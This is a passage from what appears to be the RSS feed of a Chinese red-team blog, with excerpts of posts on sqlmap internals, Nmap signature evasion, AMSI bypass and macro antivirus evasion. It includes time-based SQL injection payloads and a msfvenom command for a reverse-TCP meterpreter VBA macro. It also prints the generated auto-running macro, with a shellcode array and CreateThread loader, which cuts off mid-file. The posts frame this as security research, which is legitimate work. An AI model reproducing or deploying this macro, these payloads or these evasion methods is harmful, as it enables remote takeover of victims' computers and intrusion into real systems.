style=&#34;color:#e6db74&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;HxIh&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;123&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; AND (SELECT 5365 FROM (SELECT(SLEEP(5-(IF(57=65,0,5)))))irpj) AND &amp;#39;&lt;/span&gt;YVSA&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;YVSA&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;123&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; AND (SELECT 7844 FROM (SELECT(SLEEP(5-(IF(57=98,0,5)))))lPgR) AND &amp;#39;&lt;/span&gt;YJgx&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;YJgx&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;123&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; AND (SELECT 9479 FROM (SELECT(SLEEP(5-(IF(98=65,0,5)))))ZaRe) AND &amp;#39;&lt;/span&gt;kXSW&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;kXSW&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;123&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; AND (SELECT 6042 FROM (SELECT(SLEEP(5-(IF(65=65,0,5)))))OReg) AND &amp;#39;&lt;/span&gt;EOyg&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;EOyg&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;123&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; AND (SELECT 9179 FROM (SELECT(SLEEP(5-(IF(98 65,0,5)))))GkMV) AND &amp;#39;&lt;/span&gt;vZOZ&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;vZOZ&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;而从85组开始又出现了新的变化&lt;/p&gt;</description>
    </item>
    <item>
      <title>红队基础设施建设与改造（二）——深入理解sqlmap(上)</title>
      <link>https://yaphetszz.github.io/posts/%E7%BA%A2%E9%98%9F%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E5%BB%BA%E8%AE%BE%E4%B8%8E%E6%94%B9%E9%80%A0%E4%BA%8C%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3sqlmap%E4%B8%8A/</link>
      <pubDate>Wed, 02 Dec 2020 08:54:33 +0800</pubDate>
      <guid>https://yaphetszz.github.io/posts/%E7%BA%A2%E9%98%9F%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E5%BB%BA%E8%AE%BE%E4%B8%8E%E6%94%B9%E9%80%A0%E4%BA%8C%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3sqlmap%E4%B8%8A/</guid>
      <description>&lt;p&gt;&lt;strong&gt;本文所述的一切技术仅供网络安全研究学习之用，请勿用于任何的违法用途，否则由此所产生的一切后果自负！&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;上一篇文章我们写了Nmap的分析与改造，本篇将继续分析炙手可热的工具sqlmap。这篇文章介绍的修改的东西不多，针对sqlmap的分析较多。剖析了sqlmap的大部分功能点和所有的检测逻辑，同时还会讲到tamper的分析以及tamper的编写。由于篇幅较长，为了避免大家看着难受，准备分为上下两篇来写。&lt;/p&gt;&#xA;&lt;p&gt;首先我们通过靶场环境构造漏洞场景，靶场为pikachu，github地址为：&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/zhuifengshaonianhanlu/pikachu&#34;&gt;https://github.com/zhuifengshaonianhanlu/pikachu&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;进入存在注入漏洞的页面&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps1.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;进行抓包&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps2.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;丢进sqlmap可以看到能跑出结果&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps3.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;进行一次完整的过程时监听流量并筛选&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps4.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;在流量中我们可以很明显地发现会产生一长串的请求，筛选一下POST请求就能看到发送的payload&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps5.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;这是简单的sqlmap发包内容，我们继续深入。&lt;/p&gt;&#xA;&lt;p&gt;很多人可能只了解了sqlmap的用法，甚至都不了解用法，参数只会-u -r &amp;ndash;level –risk几个，偶尔看了大佬的文章知道了&amp;ndash;tamper但是并不了解原理。接下来就给大家从多个方面来解析一下sqlmap这款神器。&lt;/p&gt;&#xA;&lt;p&gt;首先来看看针对靶场进行测试时的输出&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps6.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;第一行进行了包格式判断，如果无法识别将直接弹出错误并推出；接下来进行了连接测试，测试到目标的连接情况；然后进行WAF和IPS检测；再判断目标是否稳定；之后进行参数的动态性检测，启发式参数（xss等）测试；之后就开始了对包中可能存在的注入点的检测。&lt;/p&gt;&#xA;&lt;p&gt;我们对sqlmap的代码进行跟踪，首先第一环节为连接测试部分，对应代码在checks.py文件中&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps7.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;判断目标连接存活后开始进入下一环节，IPS和WAF的探测，核心代码也位于checks.py中，可以看到其中参考了http://seclists.org/nmap-dev/2011/q2/att-1005/http-waf-detect.nse&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps8.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;上面的参考链接是一个Nmap的脚本，也是我们上一篇文章中所说的，不过上一篇文章没有对NSE脚本的开发做深入介绍（下次一定补上。下次一定！）&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps9.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;先来看一下脚本，我们发现主要是通过如下定义的两个攻击向量来进行检测的&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps10.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;上述的攻击向量包含了大多数常见的攻击类型，可以看到有目录穿越，敏感文件读取，SQL注入，PHP代码执行，XSS等方式，通常这几种payload会触发几乎所有防护软件的策略。可以看到在sqlmap中，payload也做了定义，定义在/lib/core/settings.py文件中，跟踪变量后可以看到其中的payload，与NSE脚本中的攻击向量相差无几。&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps11.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;判断完WAF后就是对稳定性的检测，代码还是在checks.py中&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps12.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;该方式主要通过请求时间判断，在开头的注释中写道两次请求页面，判断不同请求的时间，而这个时间变量在跟踪后得到DELAY值超过0.5时即返回不稳定&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps13.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;启发式注入检测处于heuristicCheckSqlInjection方法中，启发式注入过程中，payload生成是由,&amp;rsquo;&amp;quot;().六种字符随机组成的长度为10的字符串，同时满足&amp;rsquo;和&amp;quot;都只有一个。启发式注入的目的就是让Web应用报错，如果Web应用开启了错误回显，就可以快速识别DBMS（正则匹配）。&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps14.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;接下来针对具体场景进行分析，我们在该案例之前的靶场中，具有如下显示，可以看到正常发包时正常回显，&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps15.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;输入and 1=1以及and 1=2的测试判断是否存在注入&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps16.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps17.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;继续输入payload，进行列数判断&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps18.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps19.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;通过union select 1,2判断输出位置&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps20.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;进一步获取数据（省略了爆表列名和字段名的操作）&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps21.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;该种方式为union注入，是sqlmap中判断较为复杂的一种，因为脚本需要完成order by探测列数，select 判断列数，union select 1,2,&amp;hellip;判断输出位置，我们从代码来看sqlmap的UNION select检测逻辑，在checks.py中&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps22.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;跟进函数后发现检测文件位于/lib/techniques/union中&lt;/p&gt;&#xA;&lt;p&gt;列数判断，即order by判断&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps23.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;之后进行select null判断列数，&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps24.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;在进行该判断时经查sqlmap使用了网页相似度对比技术和高斯分布&lt;/p&gt;&#xA;&lt;p&gt;select null列数探测技术在进行时，会首先指定列数猜测过程中的最大值与最小值（指定列数 最少/最小值 为1，最多/最大值 为10），sqlmap会同时发送10个数据包，包含1个NULL至10个NULL，取回10个包的响应后进行网页相似度分析，并获取网页相似度数值（共10个，非True/False）。在这10个数值中，如果select null列数探测成功，那么成功那个响应的网页相似度数值只可能是最大值或者最小值。对10个数值中去除最大值和最小值后，留下8个值，可以认为，这8个值都是列数猜测不成功返回的响应，对这个8个数据进行高斯分布建模，得出的模型就是列数猜测不成功的模型。现在使用最大值或者最小值来计算是否符合这个不成功的模型，如果符合，说明这个数据也是列数猜测不成功的响应，如果不符合，说明这个数据也是列数猜测成功的响应。&lt;/p&gt;</description>
    </item>
    <item>
      <title>红队基础设施建设与改造（一）——Nmap解析与改造</title>
      <link>https://yaphetszz.github.io/posts/%E7%BA%A2%E9%98%9F%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E5%BB%BA%E8%AE%BE%E4%B8%8E%E6%94%B9%E9%80%A0%E4%B8%80nmap%E8%A7%A3%E6%9E%90%E4%B8%8E%E6%94%B9%E9%80%A0/</link>
      <pubDate>Fri, 27 Nov 2020 01:30:09 +0800</pubDate>
      <guid>https://yaphetszz.github.io/posts/%E7%BA%A2%E9%98%9F%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E5%BB%BA%E8%AE%BE%E4%B8%8E%E6%94%B9%E9%80%A0%E4%B8%80nmap%E8%A7%A3%E6%9E%90%E4%B8%8E%E6%94%B9%E9%80%A0/</guid>
      <description>&lt;p&gt;&lt;strong&gt;本文所述的一切技术仅供网络安全研究学习之用，请勿用于任何的违法用途，否则由此所产生的一切后果自负！&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;所谓工欲善其事必先利其器，渗透过程同样如此，虽然大部分人的目标并不是想当一个脚本小子，甚至身边有不少朋友“不屑”用别人的工具非要自己写。然后就是各种抱怨：&lt;/p&gt;&#xA;&lt;p&gt;“我X，扫描器又挂了！”“这个注入为什么我这个工具跑不出来”“怎么TM又超时了”“日，我IP又被ban了”这时候就开始真香了，自己写的全丢了，简历开头阿D明小子样样精通，实际项目里上来就是nmap，sqlmap一把梭，上了shell就是菜刀蚁剑直接连。&lt;/p&gt;&#xA;&lt;p&gt;但是实际渗透过程当中，在针对大型目标的测试中可能并不一定好使，目标系统部署着IPS，IDS直接就可以识别常规扫描器，攻击工具的连接。&lt;/p&gt;&#xA;&lt;p&gt;今天的第一篇基础设施的改造，就是我们非常常见的Nmap，nmap是一款优秀的端口扫描工具，同时内部集成了非常多的NSE脚本，在全球开源贡献者和安全人员的努力下集成的脚本越来越多，可以实现的特定设备扫描方式也越来越多，支持的漏洞种类也越来越全面，甚至有的漏洞可以实现端口扫描-&amp;gt;服务探测-&amp;gt;漏洞验证-&amp;gt;漏洞利用-&amp;gt;提权一条龙的操作，是一款非常优秀的工具。在官方wiki中的解释如下：&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Nmap (Network Mapper) is a free and open-source network scanner created by Gordon Lyon (also known by his pseudonym Fyodor Vaskovich).[3] Nmap is used to discover hosts and services on a computer network by sending packets and analyzing the responses. &#xD;&#xA;Nmap provides a number of features for probing computer networks, including host discovery and service and operating system detection. These features are extensible by scripts that provide more advanced service detection,[4] vulnerability detection,[4] and other features. Nmap can adapt to network conditions including latency and congestion during a scan. &#xD;&#xA;Nmap started as a Linux utility[5] and was ported to other systems including Windows, macOS, and BSD.[6] It is most popular on Linux, followed by Windows.[7] &#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;毕竟树大招风，现在越来越多的流量审计，IDS等设备都已经将Nmap的流量特征列入了重点监测对象。因此对流量的改造问题亟待解决，其中互联网上就有一份公开的流量特征检测规则样例，地址为：https://doc.emergingthreats.net/&lt;/p&gt;</description>
    </item>
    <item>
      <title>初窥AMSI攻防对抗</title>
      <link>https://yaphetszz.github.io/posts/asmi/</link>
      <pubDate>Sat, 21 Nov 2020 02:01:32 +0800</pubDate>
      <guid>https://yaphetszz.github.io/posts/asmi/</guid>
      <description>&lt;h2 id=&#34;什么是amsi&#34;&gt;什么是AMSI&lt;/h2&gt;&#xA;&lt;p&gt;AMSI（Antimalware Scan Interface）全称反恶意软件扫描接口，是微软提供的一个接口，官方文档地址如下：&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal&#34;&gt;https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;ASMI允许应用程序和服务与计算机上存在的任何反恶意软件产品集成。AMSI为终端用户及其数据，应用程序和工作负载提供了增强型的恶意软件防护。&lt;/p&gt;&#xA;&lt;p&gt;ASMI已集成到下列组件中：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;用户帐户控制或UAC（EXE，COM，MSI或ActiveX安装的高度）&lt;/li&gt;&#xA;&lt;li&gt;PowerShell（脚本，交互使用和动态代码评估）&lt;/li&gt;&#xA;&lt;li&gt;Windows脚本主机（wscript.exe和cscript.exe）&lt;/li&gt;&#xA;&lt;li&gt;JavaScript和VBScript&lt;/li&gt;&#xA;&lt;li&gt;Office VBA宏&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 id=&#34;amsi的工作原理&#34;&gt;AMSI的工作原理&lt;/h2&gt;&#xA;&lt;p&gt;官方给出的框架如下：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../amsi/1.png&#34; alt=&#34;AMSI体系结构&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;当ASMI打开时，其他任何程序都可以调用它，同时任何经过注册的防护软件都可以让它执行任务。&lt;/p&gt;&#xA;&lt;p&gt;在实际工作过程中，举个例子，这个例子通过异或加密，用来下载互联网上的资源，&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../amsi/2.png&#34; alt=&#34;sample script encoded in Base64&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;我们可以通过直接在PS中进行输入来确保没有通过文件执行（这可能可以绕过部分防护软件的检测）这也时我们通常说的无文件攻击，因为以这种形式产生的攻击通常驻留在内存中，常规的查杀方法难以检测。&lt;/p&gt;&#xA;&lt;p&gt;微软给出了一个例子，通过PS执行了一个脚本，被ASMI拦截&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../amsi/3.png&#34; alt=&#34;Windows Defender detecting the AMSI test sample&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;同时，AMSI还能应用到宏中，用于检测VBA和宏中是否携带有恶意操作&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../amsi/4.png&#34; alt=&#34;AMSI integration with JavaScript/VBA&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;上图经过了如下步骤：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;用户收到包含（恶意）宏的文档，该宏通过采用混淆，受密码保护的文件等技术来规避静态防病毒软件的扫描。&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;然后，用户打开包含（恶意）宏的文档。如果文档在“受保护的视图”中打开，则用户单击“启用编辑”以退出“受保护的视图”。&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;用户单击“启用宏”以允许宏运行。&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;在运行宏时，VBA运行时使用循环缓冲区记录[1]数据和与Win32，COM和VBA API调用有关的参数。&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;当观察到被认为具有高风险的特定Win32或COM API（也称为&lt;em&gt;触发器&lt;/em&gt;）[2]时，宏执行将暂停，并将循环缓冲区的内容传递给AMSI。&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;注册的AMSI反恶意软件服务提供者做出判决，以指示该宏行为是否是恶意的。&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;如果该行为是非恶意的，则继续执行宏。&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;否则，如果该行为是恶意的，则Microsoft Office将关闭该会话以响应警报[3]，并且AV可以隔离该文件。&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 id=&#34;对抗方式的进化过程&#34;&gt;对抗方式的进化过程&lt;/h2&gt;&#xA;&lt;p&gt;了解了ASMI的原理，我们可以知道它的大致工作方式，同时也知道了作用原理&lt;/p&gt;&#xA;&lt;h3 id=&#34;特定字符匹配&#34;&gt;特定字符匹配&lt;/h3&gt;&#xA;&lt;p&gt;以下为一段PS示例代码，现在是正常的代码，通常在攻防对抗的过程中会变得更为复杂：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../amsi/5.png&#34; alt=&#34;an example of a malicious PowerShell script&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;安全人员可以编写规则来检测其中的代码，例如对字符串的匹配，规则为匹配&lt;code&gt;Write-Host&#39;pwnd！&#39;&lt;/code&gt;,这时运行这段代码就会被ASMI拦截。这时候基础的对抗就应运而生，如果目标使用的是上述的全字符匹配，黑客通过拆分的方式即可绕过&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../amsi/6.png&#34; alt=&#34;an example of a dynamic script&#34;&gt;&lt;/p&gt;&#xA;&lt;h3 id=&#34;代码仿真&#34;&gt;代码仿真&lt;/h3&gt;&#xA;&lt;p&gt;这时候的简单规则被方便绕过，因此安全人员转而进行代码仿真，即执行语句的方式来判断是否有恶意行为，然而，由于拼接字符串的方法过于多样，黑客们又可以轻松绕过，例如非常常见的Base64编码，这种形式的简单加密手段在蚁剑中也很常见&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../amsi/7.png&#34; alt=&#34;an example of script content in Base64&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>宏免杀分析</title>
      <link>https://yaphetszz.github.io/posts/%E5%AE%8F%E5%85%8D%E6%9D%80%E7%A0%94%E7%A9%B6/</link>
      <pubDate>Wed, 04 Nov 2020 10:24:11 +0800</pubDate>
      <guid>https://yaphetszz.github.io/posts/%E5%AE%8F%E5%85%8D%E6%9D%80%E7%A0%94%E7%A9%B6/</guid>
      <description>&lt;p&gt;&lt;strong&gt;本文所述的一切技术仅供网络安全研究学习之用，请勿用于任何的违法用途，否则由此所产生的一切后果自负！&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;h1 id=&#34;宏病毒攻击方式的分析与研究&#34;&gt;宏病毒攻击方式的分析与研究&lt;/h1&gt;&#xA;&lt;p&gt;在目前的APT攻防对抗中，宏病毒作为钓鱼的主要技术支撑手段，在打点过程中起到了关键性的作用，不过随着宏病毒的泛滥，各大杀软厂商也相应地采取措施进行查杀，宏免杀技术也应运而生。从早期mht只需修改后缀就能执行的方式，到现在的各种混淆，远程加载等方式，对抗手段不断更新升级。本文就来简要分析一下目前主要的攻击方式实现原理。&lt;/p&gt;&#xA;&lt;h2 id=&#34;什么是宏病毒&#34;&gt;什么是宏病毒&lt;/h2&gt;&#xA;&lt;p&gt;宏病毒是一种寄存在文档或模板的宏中的计算机病毒。一旦打开这样的文档，其中的宏就会被执行，于是宏病毒就会被激活，转移到计算机上，并驻留在Normal模板上。从此以后，所有自动保存的文档都会“感染”上这种宏病毒，而且如果其他用户打开了感染病毒的文档，宏病毒又会转移到他的计算机上。&lt;/p&gt;&#xA;&lt;h2 id=&#34;宏病毒的危害&#34;&gt;宏病毒的危害&lt;/h2&gt;&#xA;&lt;p&gt;主要是感染文档，最早期的简单宏病毒目的只是让受害者无法打开文档，无法打印文档等，不过随着对抗手段的升级，目前的宏病毒主要以控制受害者电脑，获取到shell为目的，危害极大。&lt;/p&gt;&#xA;&lt;h2 id=&#34;宏病毒的生成&#34;&gt;宏病毒的生成&lt;/h2&gt;&#xA;&lt;h3 id=&#34;msf生成宏&#34;&gt;MSF生成宏&lt;/h3&gt;&#xA;&lt;p&gt;MSF作为主流渗透测试框架，功能多样，生成宏病毒自然不在话下。MSF通过msfvenom实现，示例命令如下：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msfvenom -p windows/meterpreter/reverse_tcp lhost&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;172.16.12.129 lport&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4444&lt;/span&gt; -f vba -o msf.vba&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;宏的内容如下：&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-vbscript&#34; data-lang=&#34;vbscript&#34;&gt;#If Vba7 Then&#xD;&#xA;&#x9;Private Declare PtrSafe Function CreateThread Lib &amp;#34;kernel32&amp;#34; (ByVal Ffqss As Long, ByVal Ggwnuq As Long, ByVal Iifiex As LongPtr, Gksky As Long, ByVal Hlnyst As Long, Kmko As Long) As LongPtr&#xD;&#xA;&#x9;Private Declare PtrSafe Function VirtualAlloc Lib &amp;#34;kernel32&amp;#34; (ByVal Vnbsa As Long, ByVal Xkoptrnhw As Long, ByVal Kghlzh As Long, ByVal Lppdd As Long) As LongPtr&#xD;&#xA;&#x9;Private Declare PtrSafe Function RtlMoveMemory Lib &amp;#34;kernel32&amp;#34; (ByVal Ztmgrm As LongPtr, ByRef Dnywi As Any, ByVal Zpxn As Long) As LongPtr&#xD;&#xA;#Else&#xD;&#xA;&#x9;Private Declare Function CreateThread Lib &amp;#34;kernel32&amp;#34; (ByVal Ffqss As Long, ByVal Ggwnuq As Long, ByVal Iifiex As Long, Gksky As Long, ByVal Hlnyst As Long, Kmko As Long) As Long&#xD;&#xA;&#x9;Private Declare Function VirtualAlloc Lib &amp;#34;kernel32&amp;#34; (ByVal Vnbsa As Long, ByVal Xkoptrnhw As Long, ByVal Kghlzh As Long, ByVal Lppdd As Long) As Long&#xD;&#xA;&#x9;Private Declare Function RtlMoveMemory Lib &amp;#34;kernel32&amp;#34; (ByVal Ztmgrm As Long, ByRef Dnywi As Any, ByVal Zpxn As Long) As Long&#xD;&#xA;#EndIf&#xD;&#xA;&#xD;&#xA;Sub Auto_Open()&#xD;&#xA;&#x9;Dim Ltw As Long, Eso As Variant, Ytpg As Long&#xD;&#xA;#If Vba7 Then&#xD;&#xA;&#x9;Dim  Tpgwi As LongPtr, Ivlfxyv As LongPtr&#xD;&#xA;#Else&#xD;&#xA;&#x9;Dim  Tpgwi As Long, Ivlfxyv As Long&#xD;&#xA;#EndIf&#xD;&#xA;&#x9;Eso = Array(232,130,0,0,0,96,137,229,49,192,100,139,80,48,139,82,12,139,82,20,139,114,40,15,183,74,38,49,255,172,60,97,124,2,44,32,193,207,13,1,199,226,242,82,87,139,82,16,139,74,60,139,76,17,120,227,72,1,209,81,139,89,32,1,211,139,73,24,227,58,73,139,52,139,1,214,49,255,172,193, _&#xD;&#xA;207,13,1,199,56,224,117,246,3,125,248,59,125,36,117,228,88,139,88,36,1,211,102,139,12,75,139,88,28,1,211,139,4,139,1,208,137,68,36,36,91,91,97,89,90,81,255,224,95,95,90,139,18,235,141,93,104,51,50,0,0,104,119,115,50,95,84,104,76,119,38,7,137,232,255,208,184,144,1,0, _&#xD;&#xA;0,41,196,84,80,104,41,128,107,0,255,213,106,10,104,172,16,12,129,104,2,0,17,92,137,230,80,80,80,80,64,80,64,80,104,234,15,223,224,255,213,151,106,16,86,87,104,153,165,116,97,255,213,133,192,116,10,255,78,8,117,236,232,103,0,0,0,106,0,106,4,86,87,104,2,217,200,95,255,213, _&#xD;&#xA;131,248,0,126,54,139,54,106,64,104,0,16,0,0,86,106,0,104,88,164,83,229,255,213,147,83,106,0,86,83,87,104,2,217,200,95,255,213,131,248,0,125,40,88,104,0,64,0,0,106,0,80,104,11,47,15,48,255,213,87,104,117,110,77,97,255,213,94,94,255,12,36,15,133,112,255,255,255,233,155, _&#xD;&#xA;255,255,255,1,195,41,198,117,193,195,187,240,181,162,86,106,0,83,255,213)&#xD;&#xA;&#xD;&#xA;&#x9;Tpgwi = VirtualAlloc(0, UBound(Eso), &amp;amp;H1000, &amp;amp;H40)&#xD;&#xA;&#x9;For Ytpg = LBound(Eso) To UBound(Eso)&#xD;&#xA;&#x9;&#x9;Ltw = Eso(Ytpg)&#xD;&#xA;&#x9;&#x9;Ivlfxyv = RtlMoveMemory(Tpgwi + Ytpg, Ltw, 1)&#xD;&#xA;&#x9;Next Ytpg&#xD;&#xA;&#x9;Ivlfxyv = CreateThread(0, 0, Tpgwi, 0, 0, 0)&#xD;&#xA;End Sub&#xD;&#xA;Sub AutoOpen()&#xD;&#xA;&#x9;Auto_Open&#xD;&#xA;End Sub&#xD;&#xA;Sub 